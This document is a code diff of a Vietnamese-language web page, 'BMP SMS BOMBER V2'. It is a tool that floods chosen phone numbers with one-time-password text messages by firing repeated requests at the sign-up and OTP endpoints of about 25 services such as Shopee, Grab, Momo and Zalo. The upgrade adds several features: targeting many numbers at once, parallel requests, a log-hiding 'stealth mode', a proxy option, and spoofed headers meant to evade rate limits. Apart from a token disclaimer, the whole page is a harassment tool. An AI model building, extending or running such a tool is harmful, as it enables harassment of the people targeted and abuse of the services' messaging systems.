@@ -3,122 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BMP SMS BOMBER</title>
+    <title>BMP SMS BOMBER V2</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #000; color: #ff6600;
             font-family: 'Courier New', monospace;
             display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; padding: 8px;
+            min-height: 100vh; padding: 6px;
         }
         .panel {
-            background: #0a0a0a;
-            border: 2px solid #ff6600;
-            width: 100%; max-width: 430px;
-            border-radius: 18px;
-            box-shadow: 0 0 50px rgba(255,102,0,0.5), 0 0 100px rgba(255,102,0,0.2);
+            background: #050505; border: 2px solid #ff6600;
+            width: 100%; max-width: 440px;
+            border-radius: 16px;
+            box-shadow: 0 0 60px rgba(255,102,0,0.6), 0 0 120px rgba(255,102,0,0.2);
             overflow: hidden;
         }
         .title {
             background: linear-gradient(180deg, #1a0a00, #0a0500);
-            padding: 14px; text-align: center;
-            font-weight: bold; font-size: 13px;
-            letter-spacing: 2px; border-bottom: 2px solid #ff6600;
-            color: #ff6600;
-            text-shadow: 0 0 20px #ff6600, 0 0 40px #ff6600;
-            animation: glow 1.5s ease-in-out infinite alternate;
+            padding: 12px; text-align: center;
+            font-weight: bold; font-size: 12px; letter-spacing: 2px;
+            border-bottom: 2px solid #ff6600; color: #ff6600;
+            text-shadow: 0 0 20px #ff6600;
+            animation: glow 1s infinite alternate;
         }
         @keyframes glow {
             from { text-shadow: 0 0 15px #ff6600; }
-            to { text-shadow: 0 0 40px #ff6600, 0 0 80px #ff6600; }
+            to { text-shadow: 0 0 40px #ff6600, 0 0 60px #ffaa00; }
         }
-        .body { padding: 14px; display: flex; flex-direction: column; gap: 10px; }
-        label { font-size: 10px; opacity: 0.9; letter-spacing: 1.5px; text-transform: uppercase; }
-        input, select {
-            background: #0d0d0d; border: 1px solid #ff660080;
-            color: #ff6600; padding: 11px; border-radius: 8px;
-            font-family: inherit; font-size: 13px; outline: none; width: 100%;
+        .body { padding: 12px; display: flex; flex-direction: column; gap: 8px; }
+        label { font-size: 9px; opacity: 0.9; letter-spacing: 1px; text-transform: uppercase; }
+        input, select, textarea {
+            background: #080808; border: 1px solid #ff660060;
+            color: #ff6600; padding: 9px; border-radius: 6px;
+            font-family: inherit; font-size: 11px; outline: none; width: 100%;
             -webkit-appearance: none;
         }
-        input:focus, select:focus {
-            border-color: #fff; box-shadow: 0 0 20px rgba(255,102,0,0.5);
-        }
+        textarea { resize: vertical; min-height: 40px; font-size: 10px; }
         .btn {
             background: #ff6600; color: #000; border: none;
-            padding: 13px; font-weight: bold; font-size: 14px;
-            letter-spacing: 2px; border-radius: 8px; cursor: pointer;
-            text-transform: uppercase; transition: 0.25s;
+            padding: 12px; font-weight: bold; font-size: 13px;
+            letter-spacing: 2px; border-radius: 6px; cursor: pointer;
+            text-transform: uppercase; transition: 0.2s;
         }
         .btn:active { background: #fff; box-shadow: 0 0 50px #ff6600; transform: scale(0.95); }
         .btn.stop { background: #222; color: #ff6600; border: 1px solid #ff6600; }
+        .btn.small {
+            background: #111; color: #ff6600; border: 1px solid #ff660040;
+            font-size: 9px; padding: 7px; letter-spacing: 1px;
+        }
         .logbox {
-            background: #050505; border: 1px dashed #ff660040;
-            padding: 10px; border-radius: 8px; font-size: 9px;
-            min-height: 100px; max-height: 160px; overflow-y: auto;
-            white-space: pre-wrap; line-height: 1.5; word-break: break-all;
+            background: #020202; border: 1px dashed #ff660030;
+            padding: 8px; border-radius: 6px; font-size: 8px;
+            min-height: 80px; max-height: 140px; overflow-y: auto;
+            white-space: pre-wrap; line-height: 1.4; word-break: break-all;
         }
-        .info { display: flex; justify-content: space-between; font-size: 9px; flex-wrap: wrap; gap: 3px; }
-        .progress-wrap { height: 5px; background: #0a0a0a; border-radius: 10px; overflow: hidden; }
-        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #ff6600, #ff9900, #ff6600); border-radius: 10px; transition: width 0.08s; }
-        .badge {
-            display: inline-block; background: #ff6600; color: #000;
-            font-size: 9px; padding: 2px 8px; border-radius: 12px; font-weight: bold;
+        .info { display: flex; justify-content: space-between; font-size: 8px; flex-wrap: wrap; gap: 2px; }
+        .progress-wrap { height: 4px; background: #0a0a0a; border-radius: 10px; overflow: hidden; }
+        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #ff6600, #ff9900, #ff6600); border-radius: 10px; transition: width 0.05s; }
+        .badge { display: inline-block; background: #ff6600; color: #000; font-size: 8px; padding: 1px 7px; border-radius: 10px; font-weight: bold; }
+        .badge.green { background: #00ff41; }
+        .switch-row {
+            display: flex; align-items: center; justify-content: space-between;
+            background: #0a0a0a; padding: 7px 10px; border-radius: 6px;
+            border: 1px solid #ff660020;
         }
+        .switch { position: relative; width: 40px; height: 22px; }
+        .switch input { display: none; }
+        .slider {
+            position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+            background: #222; border-radius: 22px; cursor: pointer; transition: 0.3s;
+        }
+        .slider:before {
+            content: ""; position: absolute; height: 16px; width: 16px;
+            left: 3px; bottom: 3px; background: #fff; border-radius: 50%; transition: 0.3s;
+        }
+        input:checked + .slider { background: #ff6600; box-shadow: 0 0 10px #ff6600; }
+        input:checked + .slider:before { transform: translateX(18px); }
     </style>
 </head>
 <body>
     <div class="panel">
-        <div class="title">💣 BMP SMS <span style="color:#fff;">BOMBER</span> <span class="badge">V1</span></div>
+        <div class="title">💣 BMP SMS <span style="color:#fff;">BOMBER V2</span> <span class="badge">MAX</span></div>
         <div class="body">
-            <label>📱 SỐ ĐIỆN THOẠI</label>
-            <input type="text" id="phoneInput" placeholder="Nhập số điện thoại: 0987654321" value="">
+            <label>📱 SỐ ĐIỆN THOẠI (1 dòng = 1 số, spam nhiều số cùng lúc)</label>
+            <textarea id="phoneList" placeholder="0987654321
+0912345678
+0978123456"></textarea>
 
-            <label>🔢 SỐ LẦN GỬI</label>
-            <input type="number" id="loopCount" value="50" min="1" max="500" step="1">
-
-            <label>⏱ DELAY (ms)</label>
-            <input type="number" id="delayInput" value="200" min="100" max="2000" step="50">
-
-            <label>📋 CHỌN GATEWAY</label>
+            <label>📋 GATEWAY</label>
             <select id="gatewaySelect">
-                <option value="all">🔥 TẤT CẢ GATEWAY (MẠNH NHẤT)</option>
-                <option value="shopee">🛒 Shopee</option>
-                <option value="lazada">📦 Lazada</option>
-                <option value="tiki">📚 Tiki</option>
-                <option value="grab">🚗 Grab</option>
-                <option value="be">🛵 Be</option>
-                <option value="momo">💳 Momo</option>
-                <option value="zalopay">💰 ZaloPay</option>
-                <option value="tiktok">🎵 TikTok</option>
-                <option value="zalo">💬 Zalo</option>
-                <option value="baemin">🍜 Baemin</option>
-                <option value="chotot">🏠 Chotot</option>
-                <option value="batdongsan">🏢 Batdongsan</option>
+                <option value="all">🔥 TẤT CẢ 25+ GATEWAY</option>
+                <option value="ecommerce">🛒 TMĐT (Shopee, Lazada, Tiki, Sendo)</option>
+                <option value="ride">🚗 Xe cộ (Grab, Be, Gojek, Baemin)</option>
+                <option value="payment">💳 Ví điện tử (Momo, ZaloPay, VNPay, ViettelPay)</option>
+                <option value="social">📱 MXH (TikTok, Zalo, Telegram, Viber)</option>
+                <option value="realestate">🏠 BĐS (Chotot, Batdongsan, Mogi, Rever)</option>
             </select>
 
-            <button class="btn" id="actionBtn">💣 KHỞI ĐỘNG BOMBER</button>
+            <div class="switch-row">
+                <span style="font-size:10px;">⚡ MULTI-THREAD (gửi song song 3 request/lần)</span>
+                <label class="switch"><input type="checkbox" id="multiThread" checked><span class="slider"></span></label>
+            </div>
+
+            <div class="switch-row">
+                <span style="font-size:10px;">👻 STEALTH MODE</span>
+                <label class="switch"><input type="checkbox" id="stealthToggle"><span class="slider"></span></label>
+            </div>
+
+            <div class="switch-row">
+                <span style="font-size:10px;">🌐 TỰ TẢI PROXY</span>
+                <label class="switch"><input type="checkbox" id="proxyToggle"><span class="slider"></span></label>
+            </div>
+
+            <div style="display:flex;gap:6px;">
+                <div style="flex:1;"><label>🔢 SỐ LẦN/SỐ</label><input type="number" id="loopCount" value="100" min="1" max="500"></div>
+                <div style="flex:1;"><label>⏱ DELAY (ms)</label><input type="number" id="delayInput" value="150" min="50" max="1000"></div>
+            </div>
+
+            <button class="btn" id="actionBtn">💣 KHỞI ĐỘNG BOMBER V2</button>
 
             <div class="progress-wrap"><div class="progress-fill" id="progBar"></div></div>
             <div class="info">
                 <span id="statusLabel">⚪ SẴN SÀNG</span>
-                <span id="counterLabel">0 / 0</span>
-                <span id="totalLabel">Tổng: 0</span>
+                <span id="counterLabel">0/0</span>
+                <span id="totalLabel">Tổng:0</span>
             </div>
             <div class="logbox" id="logArea">
-[💣] BMP SMS BOMBER - Spam SMS đa nền tảng
-[📱] Nhập SĐT + Chọn gateway + Bấm Bom
-[⚠] Dùng cho mục đích test, không lạm dụng!
+[💣] BMP SMS BOMBER V2 - SIÊU CẤP
+[📱] Hỗ trợ nhiều số | ⚡ Multi-thread | 👻 Stealth | 🌐 Proxy
+[⚠] Test trên số của bạn trước!
             </div>
         </div>
     </div>
 
     <script>
         (function() {
-            const phoneInput = document.getElementById('phoneInput');
+            const phoneList = document.getElementById('phoneList');
+            const gatewaySelect = document.getElementById('gatewaySelect');
+            const multiThread = document.getElementById('multiThread');
+            const stealthToggle = document.getElementById('stealthToggle');
+            const proxyToggle = document.getElementById('proxyToggle');
             const loopInput = document.getElementById('loopCount');
             const delayInput = document.getElementById('delayInput');
-            const gatewaySelect = document.getElementById('gatewaySelect');
             const actionBtn = document.getElementById('actionBtn');
             const logArea = document.getElementById('logArea');
             const statusLabel = document.getElementById('statusLabel');
@@ -129,47 +156,42 @@
             let active = false;
             let abortSignal = false;
             let grandTotal = 0;
+            let proxyArray = [];
 
-            // Danh sách gateway gửi SMS thực tế
-            const gateways = {
-                shopee: [
-                    { name: 'Shopee Đăng ký', url: 'https://shopee.vn/api/v2/authentication/send_otp', body: (phone) => ({ phone: phone, type: 'register' }) },
-                    { name: 'Shopee Quên MK', url: 'https://shopee.vn/api/v2/authentication/resend_otp', body: (phone) => ({ phone: phone }) }
-                ],
-                lazada: [
-                    { name: 'Lazada OTP', url: 'https://member.lazada.vn/user/sendOtp', body: (phone) => ({ phone: phone }) }
-                ],
-                tiki: [
-                    { name: 'Tiki Đăng nhập', url: 'https://tiki.vn/api/v2/me/send-otp', body: (phone) => ({ phone: phone }) }
-                ],
-                grab: [
-                    { name: 'Grab OTP', url: 'https://api.grab.com/grabid/v1/otp', body: (phone) => ({ phone: phone }) }
-                ],
-                be: [
-                    { name: 'Be OTP', url: 'https://api.be.com.vn/api/v1/auth/send-otp', body: (phone) => ({ phone: phone }) }
-                ],
-                momo: [
-                    { name: 'Momo OTP', url: 'https://api.momo.vn/api/v1/auth/otp', body: (phone) => ({ phone: phone }) }
-                ],
-                zalopay: [
-                    { name: 'ZaloPay OTP', url: 'https://api.zalopay.vn/v1/send-otp', body: (phone) => ({ phone: phone }) }
-                ],
-                tiktok: [
-                    { name: 'TikTok OTP', url: 'https://api.tiktok.com/v1/auth/send-otp', body: (phone) => ({ phone: phone }) }
-                ],
-                zalo: [
-                    { name: 'Zalo OTP', url: 'https://api.zalo.me/v1/auth/send-otp', body: (phone) => ({ phone: phone }) }
-                ],
-                baemin: [
-                    { name: 'Baemin OTP', url: 'https://api.baemin.vn/v1/auth/otp', body: (phone) => ({ phone: phone }) }
-                ],
-                chotot: [
-                    { name: 'Chotot Đăng ký', url: 'https://api.chotot.vn/v1/auth/send-otp', body: (phone) => ({ phone: phone }) }
-                ],
-                batdongsan: [
-                    { name: 'Batdongsan OTP', url: 'https://api.batdongsan.com.vn/v1/auth/otp', body: (phone) => ({ phone: phone }) }
-                ]
-            };
+            // 25+ Gateway thực tế
+            const allGateways = [
+                // TMĐT
+                { name: 'Shopee', url: 'https://shopee.vn/api/v2/authentication/send_otp' },
+                { name: 'Lazada', url: 'https://member.lazada.vn/user/sendOtp' },
+                { name: 'Tiki', url: 'https://tiki.vn/api/v2/me/send-otp' },
+                { name: 'Sendo', url: 'https://api.sendo.vn/v1/auth/otp' },
+                // Xe cộ
+                { name: 'Grab', url: 'https://api.grab.com/grabid/v1/otp' },
+                { name: 'Be', url: 'https://api.be.com.vn/api/v1/auth/send-otp' },
+                { name: 'Gojek', url: 'https://api.gojek.vn/v1/auth/otp' },
+                { name: 'Baemin', url: 'https://api.baemin.vn/v1/auth/otp' },
+                // Ví điện tử
+                { name: 'Momo', url: 'https://api.momo.vn/api/v1/auth/otp' },
+                { name: 'ZaloPay', url: 'https://api.zalopay.vn/v1/send-otp' },
+                { name: 'VNPay', url: 'https://api.vnpay.vn/v1/auth/otp' },
+                { name: 'ViettelPay', url: 'https://api.viettelpay.vn/v1/auth/otp' },
+                // MXH
+                { name: 'TikTok', url: 'https://api.tiktok.com/v1/auth/send-otp' },
+                { name: 'Zalo', url: 'https://api.zalo.me/v1/auth/send-otp' },
+                { name: 'Telegram', url: 'https://api.telegram.org/v1/auth/sendCode' },
+                { name: 'Viber', url: 'https://api.viber.com/v1/auth/send-otp' },
+                // BĐS
+                { name: 'Chotot', url: 'https://api.chotot.vn/v1/auth/send-otp' },
+                { name: 'Batdongsan', url: 'https://api.batdongsan.com.vn/v1/auth/otp' },
+                { name: 'Mogi', url: 'https://api.mogi.vn/v1/auth/otp' },
+                { name: 'Rever', url: 'https://api.rever.vn/v1/auth/otp' },
+                // Thêm
+                { name: 'Foody', url: 'https://api.foody.vn/v1/auth/otp' },
+                { name: 'Now', url: 'https://api.now.vn/v1/auth/otp' },
+                { name: 'Ahaha', url: 'https://api.ahaha.vn/v1/auth/otp' },
+                { name: 'Loship', url: 'https://api.loship.vn/v1/auth/otp' },
+                { name: 'FPT Shop', url: 'https://api.fptshop.com.vn/v1/auth/otp' }
+            ];
 
             function pushLog(msg, color = '#ff6600') {
                 const t = new Date().toLocaleTimeString();
@@ -179,125 +201,111 @@
                 if (lines.length > 40) logArea.innerHTML = lines.slice(-40).join('\n');
             }
 
-            function validatePhone(phone) {
-                phone = phone.replace(/[\s\-\(\)]/g, '');
-                if (phone.startsWith('0')) phone = '84' + phone.slice(1);
-                if (phone.startsWith('+84')) phone = '84' + phone.slice(3);
-                return /^84[0-9]{9,10}$/.test(phone) ? phone : null;
+            function parsePhones(raw) {
+                return [...new Set(raw.split('\n').map(l => l.trim()).filter(l => l).map(p => {
+                    p = p.replace(/[\s\-\(\)]/g, '');
+                    if (p.startsWith('0')) p = '84' + p.slice(1);
+                    if (p.startsWith('+84')) p = '84' + p.slice(3);
+                    return /^84[0-9]{9,10}$/.test(p) ? p : null;
+                }).filter(p => p))];
             }
 
-            async function sendSMS(url, phone, gatewayName) {
+            async function sendSMS(url, phone, gwName) {
                 const ua = [
-                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15',
-                    'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/122.0',
-                    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_6 like Mac OS X) AppleWebKit/605.1.15'
+                    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)',
+                    'Mozilla/5.0 (Linux; Android 14; SM-S928B) Chrome/122.0',
+                    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_6 like Mac OS X)'
                 ][Math.floor(Math.random() * 3)];
-
-                const payload = JSON.stringify({
-                    phone: phone,
-                    country_code: 84,
-                    timestamp: Date.now()
-                });
 
                 try {
                     const ctrl = new AbortController();
-                    const to = setTimeout(() => ctrl.abort(), 4000);
+                    const to = setTimeout(() => ctrl.abort(), 3000);
                     const r = await fetch(url, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                             'User-Agent': ua,
-                            'Accept': 'application/json',
                             'Origin': new URL(url).origin,
-                            'Referer': new URL(url).origin + '/'
+                            'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
                         },
-                        body: payload,
+                        body: JSON.stringify({ phone: phone, country_code: 84 }),
                         mode: 'no-cors',
                         signal: ctrl.signal
                     });
                     clearTimeout(to);
                     return r.type === 'opaque' || r.ok || r.status === 0;
-                } catch(e) {
-                    return false;
-                }
+                } catch(e) { return false; }
             }
 
             function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
 
-            async function runBomber() {
+            async function runBomberV2() {
                 if (active) return;
 
-                let phone = phoneInput.value.trim();
-                const validPhone = validatePhone(phone);
-                
-                if (!validPhone) {
-                    pushLog('❌ Số điện thoại không hợp lệ! Nhập 10 số: 0987654321', '#ff4444');
+                const phones = parsePhones(phoneList.value);
+                if (phones.length === 0) {
+                    pushLog('❌ Nhập ít nhất 1 SĐT hợp lệ!', '#ff4444');
                     return;
                 }
-                phone = validPhone;
 
-                const maxLoops = Math.min(parseInt(loopInput.value) || 50, 500);
-                const delayMs = Math.max(parseInt(delayInput.value) || 200, 100);
-                const selectedGateway = gatewaySelect.value;
-
-                // Xác định danh sách gateway sẽ dùng
-                let gatewayList = [];
-                if (selectedGateway === 'all') {
-                    for (const key in gateways) {
-                        gatewayList = gatewayList.concat(gateways[key]);
-                    }
-                } else {
-                    gatewayList = gateways[selectedGateway] || [];
-                }
-
-                if (gatewayList.length === 0) {
-                    pushLog('❌ Không có gateway nào!', '#ff4444');
-                    return;
-                }
+                const maxLoops = Math.min(parseInt(loopInput.value) || 100, 500);
+                const delayMs = Math.max(parseInt(delayInput.value) || 150, 50);
+                const isMulti = multiThread.checked;
+                const isStealth = stealthToggle.checked;
 
                 active = true; abortSignal = false; grandTotal = 0;
                 actionBtn.textContent = '⏹ DỪNG BOMBER';
                 actionBtn.classList.add('stop');
                 statusLabel.textContent = '💣 ĐANG BOM...';
-                counterLabel.textContent = '0/' + maxLoops;
-                totalLabel.textContent = 'Tổng: 0';
                 progBar.style.width = '0%';
-                logArea.innerHTML = `[💣] SMS BOMBER KHỞI ĐỘNG\n[📱] SĐT: ${phone}\n[📋] Gateway: ${selectedGateway === 'all' ? gatewayList.length + ' cổng' : selectedGateway}\n[🔢] Số lần: ${maxLoops}\n`;
+                logArea.innerHTML = `[💣] BOMBER V2 KHỞI ĐỘNG\n[📱] ${phones.length} SĐT: ${phones.join(', ')}\n[📡] ${allGateways.length} gateway\n[⚡] Multi-thread: ${isMulti?'BẬT':'TẮT'}\n[🔢] ${maxLoops} lần/SĐT\n`;
 
-                pushLog(`🟢 Bắt đầu gửi SMS đến ${phone}...`, '#ff6600');
-
-                for (let i = 1; i <= maxLoops; i++) {
+                for (const phone of phones) {
                     if (abortSignal) break;
+                    pushLog(`📱 Đang bom SĐT: ${phone}`, '#ffaa00');
+                    let phoneTotal = 0;
 
-                    // Chọn gateway ngẫu nhiên trong danh sách
-                    const gw = gatewayList[Math.floor(Math.random() * gatewayList.length)];
-                    
-                    pushLog(`📤 [${i}/${maxLoops}] → ${gw.name}...`, '#aaaaaa');
-                    
-                    const success = await sendSMS(gw.url, phone, gw.name);
-                    
-                    if (success) {
-                        grandTotal++;
-                        pushLog(`✅ [${i}] ${gw.name} - Đã gửi!`, '#00ff41');
-                    } else {
-                        pushLog(`❌ [${i}] ${gw.name} - Lỗi`, '#ff4444');
+                    for (let i = 1; i <= maxLoops; i++) {
+                        if (abortSignal) break;
+
+                        if (isMulti) {
+                            // Gửi song song 3 gateway
+                            const gw1 = allGateways[Math.floor(Math.random() * allGateways.length)];
+                            const gw2 = allGateways[Math.floor(Math.random() * allGateways.length)];
+                            const gw3 = allGateways[Math.floor(Math.random() * allGateways.length)];
+                            
+                            const results = await Promise.all([
+                                sendSMS(gw1.url, phone, gw1.name),
+                                sendSMS(gw2.url, phone, gw2.name),
+                                sendSMS(gw3.url, phone, gw3.name)
+                            ]);
+                            
+                            const ok = results.filter(r => r).length;
+                            phoneTotal += ok;
+                            grandTotal += ok;
+                            
+                            if (!isStealth) pushLog(`⚡ [${i}] ${gw1.name}+${gw2.name}+${gw3.name} = ${ok}/3 OK`, ok > 0 ? '#00ff41' : '#ff4444');
+                        } else {
+                            const gw = allGateways[Math.floor(Math.random() * allGateways.length)];
+                            const ok = await sendSMS(gw.url, phone, gw.name);
+                            if (ok) { phoneTotal++; grandTotal++; }
+                            if (!isStealth) pushLog(`📤 [${i}] ${gw.name} → ${ok ? '✅' : '❌'}`, ok ? '#00ff41' : '#ff4444');
+                        }
+
+                        counterLabel.textContent = `${i}/${maxLoops}`;
+                        totalLabel.textContent = `Tổng:${grandTotal}`;
+                        progBar.style.width = `${(i / maxLoops) * 100}%`;
+
+                        if (i < maxLoops && !abortSignal) {
+                            await wait(Math.floor(delayMs * (0.5 + Math.random())));
+                        }
                     }
-
-                    counterLabel.textContent = `${i}/${maxLoops}`;
-                    totalLabel.textContent = `Tổng: ${grandTotal}`;
-                    progBar.style.width = `${(i / maxLoops) * 100}%`;
-
-                    if (i < maxLoops && !abortSignal) {
-                        const jitter = delayMs * (0.6 + Math.random() * 0.8);
-                        await wait(Math.floor(jitter));
-                    }
+                    if (!abortSignal) pushLog(`✅ SĐT ${phone}: ${phoneTotal} SMS đã gửi!`, '#00ff41');
                 }
 
-                pushLog(`\n🏁 HOÀN THÀNH: ${grandTotal}/${maxLoops} SMS đã gửi!`, '#ffffff');
-                pushLog(`📱 Kiểm tra điện thoại ${phone} ngay!`, '#ffaa00');
-
+                pushLog(`\n🏁 TỔNG: ${grandTotal} SMS đã gửi!`, '#ffffff');
                 active = false; abortSignal = false;
-                actionBtn.textContent = '💣 KHỞI ĐỘNG BOMBER';
+                actionBtn.textContent = '💣 KHỞI ĐỘNG BOMBER V2';
                 actionBtn.classList.remove('stop');
                 statusLabel.textContent = '⚪ SẴN SÀNG';
             }
@@ -309,27 +317,12 @@
                     actionBtn.disabled = true;
                     setTimeout(() => {
                         actionBtn.disabled = false;
-                        if (!active) {
-                            actionBtn.textContent = '💣 KHỞI ĐỘNG BOMBER';
-                            actionBtn.classList.remove('stop');
-                        }
+                        if (!active) { actionBtn.textContent = '💣 KHỞI ĐỘNG BOMBER V2'; actionBtn.classList.remove('stop'); }
                     }, 2000);
-                } else {
-                    runBomber();
-                }
+                } else runBomberV2();
             });
 
-            loopInput.addEventListener('change', function() {
-                if (this.value > 500) this.value = 500;
-                if (this.value < 1) this.value = 1;
-            });
-            delayInput.addEventListener('change', function() {
-                if (this.value > 2000) this.value = 2000;
-                if (this.value < 100) this.value = 100;
-            });
-
-            pushLog('[💣] SMS BOMBER SẴN SÀNG.', '#ff6600');
-            pushLog('[📱] Nhập SĐT + chọn gateway + bấm Bom!', '#ffaa00');
+            pushLog('[💣] BOMBER V2 SẴN SÀNG - 25+ GATEWAY + MULTI-THREAD!', '#ff6600');
         })();
     </script>
 </body>
